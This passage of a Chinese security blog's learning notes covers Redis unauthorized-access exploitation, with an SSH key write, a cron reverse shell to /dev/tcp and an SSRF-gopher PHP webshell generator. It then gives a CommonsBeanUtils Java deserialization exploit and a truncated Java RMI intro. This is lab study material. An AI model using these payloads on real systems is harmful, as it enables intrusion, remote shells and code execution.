<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; </span><br><span class="line">192.168.64.189:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkvpZ7bfxoxuHQaCWbss1FfXaz7S30Es0fJtxqDtgV4d166hNSqBlIPDGcqzRfhsrbuCkQCAbWvz89Rh45POAVITVSPnZw8gIdXUsYrWmHFP8NExBc79K+yRh6ja2uFpIELEd1k4gQBfB0fg4G6st042I58Iaj8ZabfH5EgzEG4FOeK35usxk+jioIy/mtl6xwlucWFqQXjF4OAU58O2nmCbd9dtLmV/2ZDXDqAhdRSN0MB+iKfki+c2mq6rlhRpBK/xj6G0GVNlz9GkuYR50Zq2tUO6hKY130f6KW5yHSqezUIb0UpURL4mWYz7qErtNHZrTT5U/isCqp1VYcTDrS67Ax11PoMtzJuvuLtmNruW8pKvTCC9LYVUB+5U49RiHre8duFTkXe9Yx61yT3kmPN4Ocik8tzuTA6srmKIrr7UbLal+PinO/AYgaXDDPTINNgoMwXLbByzj31CSb8eB0TOv6qwQvn3nSlA2VQXnrS/og0jNaB5KPfg/WDNo0o+0= root@Flow\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">192.168.64.189:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>记得在写入内容前后都加换行，保证格式正确</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227145153.png" ></p>
<p>然后就登陆上被攻击机的root了</p>
<h4 id="利用未授权写入定时任务"><a href="#利用未授权写入定时任务" class="headerlink" title="利用未授权写入定时任务"></a>利用未授权写入定时任务</h4><p><strong>条件</strong></p>
<p>除了前面所要求的，这次还多要求</p>
<ul>
<li>redis是root用户运行的</li>
<li>机器有定时任务功能（Linux机器大多数会有）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.64.187/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>尝试了半天，写入语句后查看&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root，也没看到反弹shell的命令，原来这个在Ubuntu上行不通，原因是：</p>
<blockquote>
<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是-rw——-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
<p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
<p><strong>由于系统的不同，crontrab定时文件位置也会不同：</strong></p>
<p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
<p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;﻿</code></p>
</blockquote>
<h4 id="ssrf-redis写入webshell"><a href="#ssrf-redis写入webshell" class="headerlink" title="ssrf+redis写入webshell"></a>ssrf+redis写入webshell</h4><p><strong>利用条件</strong></p>
<ul>
<li>首先有一个ssrf漏洞</li>
<li>redis没有设置密码认证</li>
<li>知道网站根目录，有写入权限</li>
</ul>
<p>主要用到gopher协议，用到的命令和之前是一样的，要用一个脚本（网上找的）生成gopher协议后面的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.64.189&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;whoami\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span>  <span class="comment"># 此处也可以填入 Redis 的密码，在未授权的情况下适用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令列表</span></span><br><span class="line">cmd = [</span><br><span class="line">    <span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">    <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">    <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">    <span class="string">&quot;save&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果有密码，则在命令中插入 AUTH 命令</span></span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 gopher URL</span></span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis 命令格式化函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))  <span class="comment"># 使用正确的 urllib.parse.quote</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出最终构造的 payload</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>生成payload解码看到的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227163515.png" ></p>
<p>再编一次码，然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ssrf.php?url=gopher%3A%2F%2F192%2E168%2E64%2E189%3A6379%2F%5F%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%5FPOST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell%2Ephp%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A&#x27;</span><br></pre></td></tr></table></figure>

<p>这样就能实现和之前一样的效果，当redis不对外开放时就可以考虑利用ssrf，这算是增加了攻击面，但是也要网站本身支持这些协议</p>
<h4 id="常见防护设施"><a href="#常见防护设施" class="headerlink" title="常见防护设施"></a>常见防护设施</h4><p>很容易想</p>
<p>开启防护模式，设置密码安全认证，不对外开放，修改端口为不常见的，给文件夹设置严格的访问权限</p>
<p>先这样，后面再补充一下主从复制的内容</p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsBeanUtils链学习笔记</title>
    <url>/2025/02/27/CommonsBeanUtils%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>keep going🏃‍♀️，有了前面的基础，这个应该不是很难，但是要学习新的java知识</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><p>jdk8u65</p>
</li>
<li><p>commons-beanutils 1.9.2</p>
</li>
</ul>
<p>参考<a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >Drunkbaby师傅<i class="fas fa-external-link-alt"></i></a>给的环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.9.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CommonsBeanUtils介绍"><a href="#CommonsBeanUtils介绍" class="headerlink" title="CommonsBeanUtils介绍"></a>CommonsBeanUtils介绍</h4><p><strong>CommonsBeanUtils</strong>是一个Apache库里的工具，用来简化对 <strong>Java Bean</strong> 的操作，比如</p>
<ul>
<li>反射获取类的属性</li>
<li>动态设置属性值</li>
<li>类型转换</li>
<li>Bean 之间的属性拷贝</li>
</ul>
<p><a class="link"   href="https://liaoxuefeng.com/books/java/oop/core/javabean/index.html" >Java Bean介绍文章<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>Java Bean</strong> 是符合特定规范的 Java 类，主要用于封装数据。其核心特征包括：</p>
<ul>
<li>必须有无参构造方法（可通过默认构造器或显式定义）。</li>
<li>属性私有化（<code>private</code> 修饰），通过公共的 <code>getter</code> 和 <code>setter</code> 方法访问。可以利用IDE快速生成<code>getter</code>和<code>setter</code></li>
<li>可序列化（实现 <code>Serializable</code> 接口，非强制但常见）。</li>
</ul>
<p>写一个JavaBean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125; <span class="comment">// 无参构造</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例写一个User类，然后用Commons-BeanUtils 的<code>PropertyUtils.getProperty</code>静态方法，让使用者可以直接调用任意 JavaBean 的 getter 方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227194204.png" ></p>
<p><code>PropertyUtils.getProperty()</code>传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性，刚刚的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(user, &quot;name&quot;);</span><br><span class="line">=</span><br><span class="line">user.getName(&quot;Flow&quot;);</span><br></pre></td></tr></table></figure>

<p>PropertyUtils.getProperty&#96; 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过PropertyUtils.getProperty(a,”b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter</p>
<p>除了这个CommonsBeanUtils还有很多方法可以对JavaBean进行操作，等后续再接触</p>
<h4 id="CommonsBeanUtils链分析"><a href="#CommonsBeanUtils链分析" class="headerlink" title="CommonsBeanUtils链分析"></a>CommonsBeanUtils链分析</h4><p>已知这条链子最后用的是恶意类加载，之前用到的链子尾部是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">  -&gt;TemplatesImpl#newTransformer()</span><br><span class="line">    -&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">      -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">        -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>说是<code>getOutputProperties</code>算是一个getter方法，问了一下GPT，确实都符合条件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227201901.png" ></p>
<blockquote>
<p>在 <strong>JavaBean规范</strong> 中，getter 方法的特点是：</p>
<p>1.<strong>方法名以</strong> get <strong>开头</strong>（或者对于 boolean 类型是 is 开头）。</p>
<p>2.<strong>后面跟着属性名的首字母大写版本</strong>。</p>
<p>3.<strong>必须是</strong> public <strong>访问权限</strong>。</p>
<p>4.<strong>返回一个属性的值</strong>。</p>
</blockquote>
<p>所以我们可以用<code>PropertyUtils.getProperty()</code>获取到，大概长这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那现在看谁调用了<code>PropertyUtils.getProperty()</code>，找到一个<code>BeanComparator.compare()</code>，说到compare就熟了，前面CC4接触过，那就接上了！画了个图，看起来就是殊途同归</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250227204042.png" ></p>
<h4 id="CommonsBeanUtils链EXP编写"><a href="#CommonsBeanUtils链EXP编写" class="headerlink" title="CommonsBeanUtils链EXP编写"></a>CommonsBeanUtils链EXP编写</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">    beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>卡在这里，在思考要怎么把templates作为o1传入compare，这里可以先运行尝试一下，因为<code>PriorityQueue.add()</code>会自动跳到compare，顺着到链子后部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(templates);</span><br></pre></td></tr></table></figure>

<p>这样执行会弹出计算机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228001450.png" ></p>
<p>因为BeanComparator刚好有<code>setProperty</code>方法，经过测试，下面这两句效果一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beanComparator.setProperty(&quot;outputProperties&quot;);</span><br><span class="line">setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>

<p>我们的目的是只在反序列化的时候才弹计算机，所以现在先add两个不会触发恶意类加载的值</p>
<p>这个时候 <code>beanComparator.setProperty(&quot;outputProperties&quot;);</code>这句要注释掉，不然add过程中走到compare()会报错，可以看调试的时候，o1是个整形，他么得 <code>outputProperties</code>，自然会报错，所以这一句要挪到add后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250228003345.png" ></p>
<p>add后再用反射给priorityQueue的queue传入templates，设置BeanComparator.compare()的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);</span><br></pre></td></tr></table></figure>

<p>最后的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;); <span class="comment">// 设置BeanComparator.compare()的参数</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>); </span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>这条链其实不难找，在尝试自己写的时候有点狭隘，感觉对队列这个数据结构不熟悉也是，有些地方钻了牛角尖</p>
<ul>
<li>执行beanComparator的property反射修改在add前还是add后这里调了些时间</li>
<li>反射修改里面的new Object[]{templates, templates}，亲测第一个对象一定要是templates，第二个对象可以随便</li>
</ul>
<p>记录一下过程中的纠结以后回头看可能会有新的感谢，以上有任何不对的欢迎找我指正🙏</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" >https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17588722.html" >https://www.cnblogs.com/1vxyz/p/17588722.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-RMI学习</title>
    <url>/2025/04/02/Java-RMI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>我看后面挺多漏洞和这个RMI和JNDI有关，现在先学习一下</p>
<h4 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h4><p>RMI 全称 Remote Method Invocation（远程方法调用），在一个 JVM 中 Java 程序调用在另一个远程 JVM 中运行的 Java 程序，这个远程 JVM 既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p>
<p>RMI 依赖的<strong>通信协议</strong>为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。</p>
<h5 id="RMI三个部分"><a href="#RMI三个部分" class="headerlink" title="RMI三个部分"></a>RMI三个部分</h5><ul>
<li>服务端：提供服务</li>
<li>客户端：调用服务端端服务</li>
<li>注册端：提供服务注册与服务获取，客户端可以在这里查询要调用的方法的引用</li>
</ul>
<p>交互过程（图源 <a class="link"   href="https://fynch3r.github.io/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/%EF%BC%89" >https://fynch3r.github.io/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/）<i class="fas fa-external-link-alt"></i></a><br><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250303151048.png" ></p>
<p>在Java RMI里</p>
<ul>
<li>远程服务器实现具体的Java方法并提供接口</li>
<li>客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法</li>
<li>其中对象是通过<strong>序列化</strong>方式进行编码传输的</li>
<li>RMI全部的宗旨就是尽可能简化远程接口对象的使用</li>
</ul>
<h4 id="RMI实现"><a href="#RMI实现" class="headerlink" title="RMI实现"></a>RMI实现</h4><p>先写一个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>写一个类继承这个接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你好, &quot;</span> + name + <span class="string">&quot;! 这是来自RMI服务器的问候。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置 RMI 服务器的 IP 地址</span></span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 创建服务实例</span></span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloServiceImpl</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 创建并启动RMI注册表，监听1099端口</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 将服务绑定到注册表</span></span><br><span class="line">            registry.bind(<span class="string">&quot;HelloService&quot;</span>, helloService);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务器已启动在127.0.0.1:1099...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;RMI服务器异常：&quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取RMI注册表</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 查找远程服务HelloService</span></span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) registry.lookup(<span class="string">&quot;HelloService&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 调用远程方法</span></span><br><span class="line">            <span 